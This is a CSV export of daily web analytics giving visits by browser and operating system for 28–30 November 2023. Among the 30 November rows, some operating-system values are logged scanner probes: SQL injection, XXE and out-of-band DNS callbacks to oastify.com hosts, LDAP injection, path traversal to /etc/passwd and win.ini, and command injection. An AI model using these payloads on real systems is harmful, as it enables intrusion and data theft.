date,browser,os,visits
2023-11-30,Opera,Windows,68235
2023-11-30,Edge,Android,62625
2023-11-30,Firefox,Linux,54410
2023-11-30,Internet Explorer,Windows,37861
2023-11-30,(not set),(not set),29552
2023-11-30,Mozilla Compatible Agent,Macintosh,25767
2023-11-30,Opera,Android,24070
2023-11-30,Edge,Macintosh,17586
2023-11-30,Samsung Internet,Linux,17153
2023-11-30,Safari,Linux,9261
2023-11-30,Edge,Linux,5833
2023-11-30,YaBrowser,Windows,5541
2023-11-30,(not set),iOS,4971
2023-11-30,Opera,Macintosh,4683
2023-11-30,UC Browser,Android,3498
2023-11-30,Opera Mini,(not set),2837
2023-11-30,Safari,Windows,2153
2023-11-30,Whale Browser,Android,1906
2023-11-30,Whale Browser,Windows,1780
2023-11-30,YaBrowser,Android,1616
2023-11-30,Coc Coc,Windows,1553
2023-11-30,Mozilla Compatible Agent,(not set),1513
2023-11-30,Mozilla Compatible Agent,Linux,1429
2023-11-30,Lynx,(not set),1138
2023-11-30,Opera,Linux,1127
2023-11-30,(not set),Android,1015
2023-11-30,Opera Mini,Android,977
2023-11-30,Samsung Internet,Tizen,911
2023-11-30,YaBrowser,iOS,864
2023-11-30,Chrome,(not set),717
2023-11-30,Firefox,OS/2,695
2023-11-30,DuckDuckGo Browser,iOS,638
2023-11-30,Android Runtime,Android,604
2023-11-30,Mozilla,Windows,602
2023-11-30,Aloha Browser,iOS,573
2023-11-30,Chrome,Fuchsia,558
2023-11-30,Iron,iOS,533
2023-11-30,Firefox,Firefox OS,500
2023-11-30,Mozilla,Linux,500
2023-11-30,(not set),Windows,446
2023-11-30,PaleMoon,Windows,382
2023-11-30,SeaMonkey,Windows,364
2023-11-30,Safari,Playstation 4,361
2023-11-30,Mozilla Compatible Agent,Tizen,354
2023-11-30,UC Browser,iOS,312
2023-11-30,Android Browser,Android,309
2023-11-30,Mozilla Compatible Agent,Android,261
2023-11-30,YaBrowser,Macintosh,261
2023-11-30,Aloha Browser,Android,257
2023-11-30,Phoenix Browser,Android,212
2023-11-30,Vivaldi,Windows,148
2023-11-30,Meta Quest Browser,Linux,135
2023-11-30,PaleMoon,Linux,124
2023-11-30,Waterfox,Windows,119
2023-11-30,Mozilla Compatible Agent,Windows,87
2023-11-30,Whale Browser,Macintosh,86
2023-11-30,YaBrowser,Linux,85
2023-11-30,DuckDuckGo Browser,Macintosh,68
2023-11-30,SeaMonkey,Linux,66
2023-11-30,Coc Coc,Android,64
2023-11-30,Coc Coc,Macintosh,62
2023-11-30,Firefox,FreeBSD,58
2023-11-30,Chrome,Tizen,57
2023-11-30,Puffin,Linux,57
2023-11-30,DuckDuckGo Browser,Android,56
2023-11-30,Safari,(not set),43
2023-11-30,BlackBerry,BlackBerry,39
2023-11-30,Seznam,Android,34
2023-11-30,Mozilla,Macintosh,33
2023-11-30,Opera Mini,Samsung,33
2023-11-30,Firefox,OpenBSD,27
2023-11-30,Opera Mini,BlackBerry,27
2023-11-30,Chrome,BlackBerry,26
2023-11-30,Chrome,UNIX,25
2023-11-30,Mozilla Compatible Agent,BlackBerry,25
2023-11-30,Netscape,Windows,25
2023-11-30,IE with Chrome Frame,Windows,24
2023-11-30,Internet Explorer,Windows Phone,24
2023-11-30,Phoenix Browser,iOS,24
2023-11-30,SeaMonkey,Macintosh,23
2023-11-30,Whale Browser,iOS,23
2023-11-30,Puffin,Android,22
2023-11-30,Aloha Browser,Macintosh,19
2023-11-30,Chrome,OpenBSD,18
2023-11-30,Internet Explorer,Macintosh,18
2023-11-30,Nintendo Browser,(not set),18
2023-11-30,Aloha Browser,Windows,17
2023-11-30,Maxthon,Macintosh,17
2023-11-30,Seznam,iOS,17
2023-11-30,Waterfox,Macintosh,17
2023-11-30,Edge,Xbox,16
2023-11-30,Chrome,FreeBSD,15
2023-11-30,Edge,UNIX,15
2023-11-30,Opera,(not set),15
2023-11-30,Playstation Vita Browser,Playstation Vita,15
2023-11-30,UC Browser,Windows,15
2023-11-30,Chrome,Mac OS,13
2023-11-30,Maxthon,Windows,13
2023-11-30,Puffin,Windows,13
2023-11-30,Puffin,iOS,13
2023-11-30,Firefox,iOS,12
2023-11-30,Mozilla Compatible Agent,Chrome OS,12
2023-11-30,Safari,SymbianOS,12
2023-11-30,Chrome,NetBSD,11
2023-11-30,Konqueror,Linux,11
2023-11-30,Seznam,Windows,11
2023-11-30,Internet Explorer,(not set),9
2023-11-30,Safari,Tizen,9
2023-11-30,Firefox,NetBSD,8
2023-11-30,BrowserNG,SymbianOS,7
2023-11-30,Safari,Windows Phone,7
2023-11-30,Vivaldi,Macintosh,6
2023-11-30,Waterfox,Linux,6
2023-11-30,Whale Browser,Linux,6
2023-11-30,(not set),Linux,5
2023-11-30,(not set),Nokia,5
2023-11-30,Edge,iOS,5
2023-11-30,MRCHROME,Windows,5
2023-11-30,NetFront,Sony,5
2023-11-30,PaleMoon,Macintosh,5
2023-11-30,Aloha Browser,Linux,4
2023-11-30,YE,Android,4
2023-11-30,Blazer,PalmOS,3
2023-11-30,Konqueror,(not set),3
2023-11-30,Meta Quest Browser,Android,3
2023-11-30,Opera Mini,Windows Phone,3
2023-11-30,Opera Mini,iOS,3
2023-11-30,Seznam,Macintosh,3
2023-11-30,(not set),MOT,2
2023-11-30,Camino,Macintosh,2
2023-11-30,Galeon,Linux,2
2023-11-30,Iron,Android,2
2023-11-30,Konqueror,FreeBSD,2
2023-11-30,Konqueror,NetBSD,2
2023-11-30,Konqueror,OpenBSD,2
2023-11-30,Lunascape,Windows,2
2023-11-30,Opera,BlackBerry,2
2023-11-30,Opera,Nintendo Wii,2
2023-11-30,SeaMonkey,OS/2,2
2023-11-30,Seznam,Linux,2
2023-11-30,(not set),Chrome OS,1
2023-11-30,(not set),LG,1
2023-11-30,(not set),Macintosh,1
2023-11-30,(not set),Samsung,1
2023-11-30,(not set),Sony,1
2023-11-30,(not set),SymbianOS,1
2023-11-30,Chrome,"(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % graxq SYSTEM ""http://woo7ur2i2kf80r9v5bzoe0ssajgc42s5gw31rq.oasti'||'fy.com/"">%graxq;]>'),'/l') from dual)",1
2023-11-30,Chrome,(select load_file('\\\\fo7qua2123fr0a9e5uz7ejsba2gv4lscu0lnqbf.oastify.com\\eqb')),1
2023-11-30,Chrome,*)(!(objectClass=*),1
2023-11-30,Chrome,*)(objectClass=*,1
2023-11-30,Chrome,-->'-->`--><!--#set var=vgy value=ufx5lptgti--><!--#set var=xi0 value=whz7nrvivk--><!--#echo var=vgy--><!--#echo var=xi0--><!--#exec cmd=nslookup -q=cname h2ks8cg3g5ttecngjwd9sl6do4uxin6f43vq0ep.oastify.com -->,1
2023-11-30,Chrome,.../Linux,1
2023-11-30,Chrome,../../../../../../../../../../../../../../../../etc/passwd,1
2023-11-30,Chrome,../../../../../../../../../../../../../../../../etc/passwd%00Linux,1
2023-11-30,Chrome,..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini,1
2023-11-30,Chrome,..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini%00Linux,1
2023-11-30,Chrome,/etc/passwd,1
2023-11-30,Chrome,4uivbesp1i)(!(objectClass=*),1
2023-11-30,Chrome,"<ckj xmlns=""http://a.b/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://a.b/ http://il7trdz4z6cuxd6h2xwabmpe75dy1opodf0ko9.oastify.com/ckj.xsd"">ckj</ckj>",1
2023-11-30,Chrome,"<ydl xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://vsr6yq6h6jj74qdu9a3nizwreikb81w2kt7yvn.oastify.com/foo""/></ydl>",1
2023-11-30,Chrome,"Linux
BCC:go8rub2224fs0b9f5vz8eksca3gw4msel2cphd6@oastify.com
vte: d",1
2023-11-30,Chrome,"Linux""",1
2023-11-30,Chrome,"Linux""|echo d47iksvf5m ctdmejl6bp ||",1
2023-11-30,Chrome,"Linux""|ping -n 21 127.0.0.1 ||",1
2023-11-30,Chrome,"Linux%}lvxrn'/""<pnroj",1
2023-11-30,Chrome,Linux&echo 4r76ggl8d8 freo5ed8r5&,1
2023-11-30,Chrome,"Linux&nslookup -q=cname 6krhq1ysyubiw1551lvyaao26tcm0co7cyz3ns.oastify.com.&'\""`0&nslookup -q=cname 6krhq1ysyubiw1551lvyaao26tcm0co7cyz3ns.oastify.com.&`'",1
2023-11-30,Chrome,Linux&ping -n 21 127.0.0.1&,1
2023-11-30,Chrome,Linux',1
2023-11-30,Chrome,Linux' and '3424'='3424,1
2023-11-30,Chrome,Linux' and '4452'='4460,1
2023-11-30,Chrome,Linux' and (select*from(select(sleep(20)))a)-- ,1
2023-11-30,Chrome,Linux' and 2206=2208-- ,1
2023-11-30,Chrome,Linux' and 4141=4141-- ,1
2023-11-30,Chrome,Linux' waitfor delay'0:0:20'--,1
2023-11-30,Chrome,"Linux'""`0&nslookup -q=cname 5hngn0vrvt8ht024yksx79l13s9lxbl89zw4kt.oastify.com.&`'",1
2023-11-30,Chrome,Linux'(select*from(select(sleep(20)))a)',1
2023-11-30,Chrome,Linux');declare @q varchar(99);set @q='\\255dbxjojqwehxq1mhguv69yrpxil89z2ntayyn.oasti'+'fy.com\hrs'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,Chrome,Linux')waitfor delay'0:0:20'--,1
2023-11-30,Chrome,"Linux'+(function(){if(typeof zxmyz===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);zxmyz=1;}}())+'",1
2023-11-30,Chrome,Linux'+(select load_file('\\\\mqgxwh484ahy2hbl711egquic9i26sujx7outii.oastify.com\\cvk'))+',1
2023-11-30,Chrome,Linux'+(select*from(select(sleep(20)))a)+',1
2023-11-30,Chrome,"Linux'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'",1
2023-11-30,Chrome,Linux'+sleep(20.to_i)+',1
2023-11-30,Chrome,"Linux',0)waitfor delay'0:0:20'--",1
2023-11-30,Chrome,Linux'.sleep(20).',1
2023-11-30,Chrome,Linux';declare @q varchar(99);set @q='\\sie3onwewg94un3rz7tk8wmo4fa8yympdd409oy.oasti'+'fy.com\gts'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,Chrome,"Linux'|echo 3o866q8h9s cd9w4term0 #xzwx",1
2023-11-30,Chrome,"Linux'|ping -c 21 127.0.0.1 #",1
2023-11-30,Chrome,"Linux'||(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % graxq SYSTEM ""http://jylu4ec5c7pvaejify9bon2fk6qzep2tqkdp1e.oasti'||'fy.com/"">%graxq;]>'),'/l') from dual)||'",1
2023-11-30,Chrome,Linux);declare @q varchar(99);set @q='\\grbrxb5254is3bcf8v28hkvcd3jw7mvdn1eojc8.oasti'+'fy.com\dwu'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,Chrome,"Linux,(select*from(select(sleep(20)))a)",1
2023-11-30,Chrome,Linux../../../../../../../../../../../../../../../../etc/passwd,1
2023-11-30,Chrome,Linux..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini,1
2023-11-30,Chrome,Linux42267017' or '7302'='7303,1
2023-11-30,Chrome,Linux43845002' or 7978=7978-- ,1
2023-11-30,Chrome,Linux65212037' or 2382=2388-- ,1
2023-11-30,Chrome,Linux74903521' or '9415'='9415,1
2023-11-30,Chrome,Linux;declare @q varchar(99);set @q='\\b3fm96hxhzunf6oakqe3tf77pyvrjh78xwojt7i.oasti'+'fy.com\yay'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,Chrome,"Linux>
BCC:nb2yhip9pb2zniwms2mf1rfjxa33rtfl990w5ku@oastify.com
hto: e",1
2023-11-30,Chrome,Linux]]>><,1
2023-11-30,Chrome,"Linuxsll52%>xo4ck'/""<zg08j",1
2023-11-30,Chrome,Linuxwg2r40hwrc,1
2023-11-30,Chrome,Linux{${sleep(20)}},1
2023-11-30,Chrome,"Linux|echo 8dlxnd1jx8 571y402hz1||a #' |echo 8dlxnd1jx8 571y402hz1||a #|"" |echo 8dlxnd1jx8 571y402hz1||a #",1
2023-11-30,Chrome,"Linux|nslookup -q=cname zloaruzlzncbxu6y2ewrb3pv7mdf15p1ds0xom.oastify.com.&",1
2023-11-30,Chrome,"Linux|ping -c 21 127.0.0.1||x",1
2023-11-30,Chrome,"Linux|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",1
2023-11-30,Chrome,"Linux}}g3za3'/""<vb6sf",1
2023-11-30,Chrome,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-11-30,Chrome,OS/2,1
2023-11-30,Chrome,be51smiq09,1
2023-11-30,Chrome,c:\windows\win.ini,1
2023-11-30,Chrome,"eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))",1
2023-11-30,Chrome,http://ei0po9w0w29qu93dztt68ima41auykmaa1x6lv.oastify.com/?Linux,1
2023-11-30,Chrome,n1py7if9fbszdimmi2cfrr5jnat3ht5ltcgh46.oastify.com,1
2023-11-30,Chrome,n4p4ifaq49)(objectClass=*,1
2023-11-30,Chrome,nslookup -q=cname 94bka4ivixvlg4p8lof1ud85qwwpkf88bw2j77w.oastify.com.&,1
2023-11-30,Chrome,rr8iw0o5dt,1
2023-11-30,Coc Coc,iOS,1
2023-11-30,Konqueror,SunOS,1
2023-11-30,Maxthon,Android,1
2023-11-30,Mozilla,(not set),1
2023-11-30,Mozilla,SunOS,1
2023-11-30,Mozilla Compatible Agent,BeOS,1
2023-11-30,Mozilla Compatible Agent,SymbianOS,1
2023-11-30,NetFront,Android,1
2023-11-30,NetFront,PalmOS,1
2023-11-30,NetFront,Samsung,1
2023-11-30,Netscape,Macintosh,1
2023-11-30,Netscape,iOS,1
2023-11-30,Nokia Browser,(not set),1
2023-11-30,Nokia Browser,SymbianOS,1
2023-11-30,Opera,SymbianOS,1
2023-11-30,Opera Mini,Tizen,1
2023-11-30,PaleMoon,FreeBSD,1
2023-11-30,Safari,OpenBSD,1
2023-11-30,Samsung Internet,Windows,1
2023-11-30,SeaMonkey,FreeBSD,1
2023-11-30,SeaMonkey,SunOS,1
2023-11-30,UC Browser,SymbianOS,1
2023-11-30,Vivaldi,Android,1
2023-11-29,Safari,iOS,15783743
2023-11-29,Chrome,Windows,10217375
2023-11-29,Chrome,Android,7370011
2023-11-29,Edge,Windows,4458944
2023-11-29,Safari,Macintosh,2527453
2023-11-29,Chrome,Macintosh,2245223
2023-11-29,Chrome,iOS,1844409
2023-11-29,Chrome,Chrome OS,1240160
2023-11-29,Safari (in-app),iOS,1219841
2023-11-29,Chrome,Linux,946289
2023-11-29,Samsung Internet,Android,732558
2023-11-29,Firefox,Windows,699114
2023-11-29,Android Webview,Android,552185
2023-11-29,Firefox,Macintosh,154483
2023-11-29,Internet Explorer,Windows,91486
2023-11-29,Firefox,Android,76424
2023-11-29,Opera,Windows,69840
2023-11-29,Amazon Silk,Android,67292
2023-11-29,Firefox,Linux,61947
2023-11-29,Edge,Android,57373
2023-11-29,Mozilla Compatible Agent,Macintosh,26015
2023-11-29,(not set),(not set),25206
2023-11-29,Opera,Android,23685
2023-11-29,Edge,Macintosh,17843
2023-11-29,Samsung Internet,Linux,17194
2023-11-29,Safari,Linux,9127
2023-11-29,YaBrowser,Windows,5542
2023-11-29,(not set),iOS,5353
2023-11-29,Opera,Macintosh,4822
2023-11-29,Edge,Linux,3986
2023-11-29,UC Browser,Android,3618
2023-11-29,Mozilla Compatible Agent,(not set),3198
2023-11-29,Opera Mini,(not set),2883
2023-11-29,Safari,Windows,2293
2023-11-29,Mozilla Compatible Agent,Linux,2071
2023-11-29,Whale Browser,Android,2024
2023-11-29,Whale Browser,Windows,1871
2023-11-29,Coc Coc,Windows,1807
2023-11-29,YaBrowser,Android,1614
2023-11-29,Lynx,(not set),1282
2023-11-29,Opera,Linux,1098
2023-11-29,Opera Mini,Android,1072
2023-11-29,YaBrowser,iOS,829
2023-11-29,(not set),Android,817
2023-11-29,Samsung Internet,Tizen,775
2023-11-29,DuckDuckGo Browser,iOS,689
2023-11-29,Firefox,OS/2,592
2023-11-29,Chrome,Fuchsia,580
2023-11-29,Mozilla,Windows,555
2023-11-29,(not set),Windows,530
2023-11-29,Android Runtime,Android,526
2023-11-29,Mozilla,Linux,524
2023-11-29,SeaMonkey,Windows,494
2023-11-29,Aloha Browser,iOS,488
2023-11-29,Firefox,Firefox OS,466
2023-11-29,Iron,iOS,422
2023-11-29,PaleMoon,Windows,386
2023-11-29,Chrome,(not set),337
2023-11-29,Safari,Playstation 4,335
2023-11-29,Android Browser,Android,331
2023-11-29,YaBrowser,Macintosh,304
2023-11-29,UC Browser,iOS,264
2023-11-29,Aloha Browser,Android,263
2023-11-29,Phoenix Browser,Android,244
2023-11-29,Mozilla Compatible Agent,Android,208
2023-11-29,Vivaldi,Windows,167
2023-11-29,Waterfox,Windows,135
2023-11-29,Meta Quest Browser,Linux,106
2023-11-29,PaleMoon,Linux,103
2023-11-29,YaBrowser,Linux,102
2023-11-29,Mozilla Compatible Agent,Windows,98
2023-11-29,Safari,(not set),77
2023-11-29,SeaMonkey,Linux,77
2023-11-29,Whale Browser,Macintosh,77
2023-11-29,Coc Coc,Android,70
2023-11-29,Firefox,FreeBSD,65
2023-11-29,Seznam,Android,64
2023-11-29,Chrome,Tizen,60
2023-11-29,Coc Coc,Macintosh,59
2023-11-29,DuckDuckGo Browser,Android,56
2023-11-29,Puffin,Linux,54
2023-11-29,Mozilla Compatible Agent,Tizen,53
2023-11-29,DuckDuckGo Browser,Macintosh,51
2023-11-29,Whale Browser,iOS,51
2023-11-29,Chrome,UNIX,48
2023-11-29,Aloha Browser,Macintosh,40
2023-11-29,Opera Mini,Samsung,39
2023-11-29,SeaMonkey,Macintosh,39
2023-11-29,Edge,iOS,38
2023-11-29,BlackBerry,BlackBerry,33
2023-11-29,Internet Explorer,Windows Phone,33
2023-11-29,Mozilla Compatible Agent,BlackBerry,31
2023-11-29,Chrome,BlackBerry,29
2023-11-29,Phoenix Browser,iOS,29
2023-11-29,Nintendo Browser,(not set),28
2023-11-29,Netscape,Windows,25
2023-11-29,Puffin,Android,24
2023-11-29,Mozilla,Macintosh,22
2023-11-29,Seznam,iOS,22
2023-11-29,Maxthon,Macintosh,21
2023-11-29,UC Browser,Windows,21
2023-11-29,Chrome,FreeBSD,20
2023-11-29,Edge,UNIX,20
2023-11-29,Seznam,Windows,20
2023-11-29,Edge,Xbox,19
2023-11-29,Chrome,OpenBSD,18
2023-11-29,Firefox,OpenBSD,18
2023-11-29,IE with Chrome Frame,Windows,17
2023-11-29,Aloha Browser,Windows,15
2023-11-29,Chrome,Mac OS,15
2023-11-29,Opera,(not set),15
2023-11-29,Internet Explorer,Macintosh,14
2023-11-29,Opera Mini,BlackBerry,14
2023-11-29,Safari,Tizen,14
2023-11-29,NetFront,Sony,13
2023-11-29,Safari,SymbianOS,13
2023-11-29,Firefox,iOS,12
2023-11-29,PaleMoon,Macintosh,12
2023-11-29,Puffin,iOS,11
2023-11-29,BrowserNG,SymbianOS,10
2023-11-29,Maxthon,Windows,10
2023-11-29,Waterfox,Macintosh,9
2023-11-29,Whale Browser,Linux,9
2023-11-29,Chrome,NetBSD,8
2023-11-29,Firefox,SunOS,8
2023-11-29,Waterfox,Linux,8
2023-11-29,Firefox,NetBSD,7
2023-11-29,Konqueror,Linux,7
2023-11-29,Mozilla Compatible Agent,Chrome OS,7
2023-11-29,Samsung Internet,Windows,7
2023-11-29,Seznam,Linux,7
2023-11-29,(not set),Nokia,6
2023-11-29,Internet Explorer,(not set),6
2023-11-29,Netscape,iOS,5
2023-11-29,Safari,Windows Phone,5
2023-11-29,Vivaldi,Android,5
2023-11-29,(not set),Linux,4
2023-11-29,Camino,Macintosh,4
2023-11-29,Galeon,Linux,4
2023-11-29,Seznam,Macintosh,4
2023-11-29,Whale Browser,Chrome OS,4
2023-11-29,(not set),Sony,3
2023-11-29,Firefox,UNIX,3
2023-11-29,Iron,Android,3
2023-11-29,Konqueror,OpenBSD,3
2023-11-29,Lunascape,Windows,3
2023-11-29,Mozilla Compatible Agent,SymbianOS,3
2023-11-29,Nokia Browser,(not set),3
2023-11-29,Opera,FreeBSD,3
2023-11-29,SeaMonkey,SunOS,3
2023-11-29,Vivaldi,Macintosh,3
2023-11-29,YE,Android,3
2023-11-29,(not set),Chrome OS,2
2023-11-29,(not set),MOT,2
2023-11-29,(not set),Macintosh,2
2023-11-29,Aloha Browser,Linux,2
2023-11-29,DoCoMo,NTT DoCoMo,2
2023-11-29,Galeon,FreeBSD,2
2023-11-29,Konqueror,NetBSD,2
2023-11-29,Maxthon,Android,2
2023-11-29,Mozilla,(not set),2
2023-11-29,NetFront,PalmOS,2
2023-11-29,NetFront,Samsung,2
2023-11-29,Netscape,Macintosh,2
2023-11-29,Nokia Browser,SymbianOS,2
2023-11-29,Opera,BlackBerry,2
2023-11-29,Opera,Solaris,2
2023-11-29,Opera,SunOS,2
2023-11-29,Opera,SymbianOS,2
2023-11-29,Opera Mini,Windows Phone,2
2023-11-29,Playstation 3,Playstation 3,2
2023-11-29,Playstation Vita Browser,Playstation Vita,2
2023-11-29,UC Browser,Linux,2
2023-11-29,(not set),LG,1
2023-11-29,(not set),SymbianOS,1
2023-11-29,Internet Explorer,Linux,1
2023-11-29,Iron,Windows,1
2023-11-29,Konqueror,(not set),1
2023-11-29,Mozilla Compatible Agent,BeOS,1
2023-11-29,NetFront,Linux,1
2023-11-29,Netscape,IRIX,1
2023-11-29,Netscape,SunOS,1
2023-11-29,Netscape,UNIX,1
2023-11-29,Opera Mini,iOS,1
2023-11-29,PaleMoon,Android,1
2023-11-29,Puffin,Windows,1
2023-11-29,Safari,Chrome OS,1
2023-11-29,Safari,NetBSD,1
2023-11-29,Safari,OpenBSD,1
2023-11-29,Samsung Internet,BlackBerry,1
2023-11-29,SeaMonkey,FreeBSD,1
2023-11-29,SeaMonkey,OS/2,1
2023-11-28,Safari,iOS,14707495
2023-11-28,Chrome,Windows,10296747
2023-11-28,Chrome,Android,7179091
2023-11-28,Edge,Windows,4570083
2023-11-28,Safari,Macintosh,2564791
2023-11-28,Chrome,Macintosh,2291528
2023-11-28,Chrome,iOS,1778657
2023-11-28,Chrome,Chrome OS,1243361
2023-11-28,Safari (in-app),iOS,1183549
2023-11-28,Chrome,Linux,991205
2023-11-28,Samsung Internet,Android,699517
2023-11-28,Firefox,Windows,682968
2023-11-28,Android Webview,Android,540550
2023-11-28,Firefox,Macintosh,151687
2023-11-28,Internet Explorer,Windows,74997
2023-11-28,Firefox,Android,72173
2023-11-28,Opera,Windows,70714
2023-11-28,Amazon Silk,Android,64654
2023-11-28,Firefox,Linux,59713
2023-11-28,Edge,Android,55186
2023-11-28,(not set),(not set),31897
2023-11-28,Mozilla Compatible Agent,Macintosh,24878
2023-11-28,Opera,Android,23627
2023-11-28,Edge,Macintosh,18828
2023-11-28,Samsung Internet,Linux,16595
2023-11-28,Safari,Linux,9225
2023-11-28,YaBrowser,Windows,5692
2023-11-28,(not set),iOS,5117
2023-11-28,Opera,Macintosh,4913
2023-11-28,Mozilla Compatible Agent,(not set),4125
2023-11-28,UC Browser,Android,3333
2023-11-28,Opera Mini,(not set),3162
2023-11-28,Edge,Linux,3007
2023-11-28,Safari,Windows,2198
2023-11-28,Whale Browser,Windows,1979
2023-11-28,Whale Browser,Android,1863
2023-11-28,Mozilla Compatible Agent,Linux,1759
2023-11-28,Coc Coc,Windows,1718
2023-11-28,YaBrowser,Android,1550
2023-11-28,(not set),Windows,1245
2023-11-28,Opera Mini,Android,1245
2023-11-28,Opera,Linux,1103
2023-11-28,(not set),Android,911
2023-11-28,YaBrowser,iOS,872
2023-11-28,Samsung Internet,Tizen,817
2023-11-28,Lynx,(not set),650
2023-11-28,Android Runtime,Android,639
2023-11-28,DuckDuckGo Browser,iOS,633
2023-11-28,Firefox,OS/2,631
2023-11-28,Chrome,Fuchsia,601
2023-11-28,SeaMonkey,Windows,566
2023-11-28,Mozilla,Windows,536
2023-11-28,Mozilla,Linux,520
2023-11-28,Chrome,(not set),498
2023-11-28,Aloha Browser,iOS,481
2023-11-28,Android Browser,Android,462
2023-11-28,Firefox,Firefox OS,440
2023-11-28,PaleMoon,Windows,389
2023-11-28,Iron,iOS,367
2023-11-28,Safari,Playstation 4,333
2023-11-28,YaBrowser,Macintosh,302
2023-11-28,UC Browser,iOS,277
2023-11-28,Phoenix Browser,Android,234
2023-11-28,Aloha Browser,Android,232
2023-11-28,Mozilla Compatible Agent,Android,191
2023-11-28,Waterfox,Windows,136
2023-11-28,Meta Quest Browser,Linux,121
2023-11-28,Vivaldi,Windows,116
2023-11-28,PaleMoon,Linux,98
2023-11-28,Mozilla Compatible Agent,Windows,94
2023-11-28,YaBrowser,Linux,86
2023-11-28,Coc Coc,Macintosh,74
2023-11-28,Whale Browser,Macintosh,72
2023-11-28,Firefox,FreeBSD,69
2023-11-28,SeaMonkey,Linux,67
2023-11-28,Coc Coc,Android,65
2023-11-28,DuckDuckGo Browser,Android,57
2023-11-28,DuckDuckGo Browser,Macintosh,53
2023-11-28,Chrome,Tizen,50
2023-11-28,Puffin,Linux,45
2023-11-28,BlackBerry,BlackBerry,43
2023-11-28,Netscape,Windows,37
2023-11-28,Opera Mini,Samsung,37
2023-11-28,Seznam,Android,36
2023-11-28,Whale Browser,iOS,35
2023-11-28,Mozilla Compatible Agent,BlackBerry,33
2023-11-28,Safari,(not set),32
2023-11-28,Phoenix Browser,iOS,30
2023-11-28,Aloha Browser,Macintosh,28
2023-11-28,Chrome,BlackBerry,28
2023-11-28,Chrome,UNIX,28
2023-11-28,Edge,Xbox,27
2023-11-28,Mozilla,Macintosh,25
2023-11-28,SeaMonkey,Macintosh,24
2023-11-28,Meta Quest Browser,Android,23
2023-11-28,IE with Chrome Frame,Windows,22
2023-11-28,Nintendo Browser,(not set),20
2023-11-28,Opera Mini,BlackBerry,19
2023-11-28,Internet Explorer,Macintosh,18
2023-11-28,Aloha Browser,Windows,17
2023-11-28,Chrome,FreeBSD,17
2023-11-28,Chrome,OpenBSD,17
2023-11-28,Internet Explorer,Windows Phone,16
2023-11-28,Konqueror,Linux,15
2023-11-28,Safari,Tizen,15
2023-11-28,Seznam,iOS,15
2023-11-28,Mozilla Compatible Agent,Chrome OS,14
2023-11-28,Waterfox,Macintosh,14
2023-11-28,Edge,iOS,13
2023-11-28,Seznam,Macintosh,13
2023-11-28,Whale Browser,Linux,12
2023-11-28,Firefox,OpenBSD,11
2023-11-28,Firefox,iOS,11
2023-11-28,Mozilla Compatible Agent,Tizen,10
2023-11-28,Puffin,iOS,10
2023-11-28,Seznam,Windows,10
2023-11-28,UC Browser,Windows,10
2023-11-28,Maxthon,Macintosh,9
2023-11-28,Maxthon,Windows,9
2023-11-28,Playstation Vita Browser,Playstation Vita,9
2023-11-28,Safari,SymbianOS,9
2023-11-28,Edge,UNIX,8
2023-11-28,Firefox,NetBSD,8
2023-11-28,Firefox,SunOS,8
2023-11-28,Internet Explorer,(not set),8
2023-11-28,Nokia Browser,SymbianOS,8
2023-11-28,Opera,(not set),8
2023-11-28,Waterfox,Linux,8
2023-11-28,(not set),Linux,7
2023-11-28,BrowserNG,SymbianOS,7
2023-11-28,Chrome,NetBSD,7
2023-11-28,YE,Android,7
2023-11-28,Aloha Browser,Linux,6
2023-11-28,(not set),Nokia,5
2023-11-28,Opera,BlackBerry,5
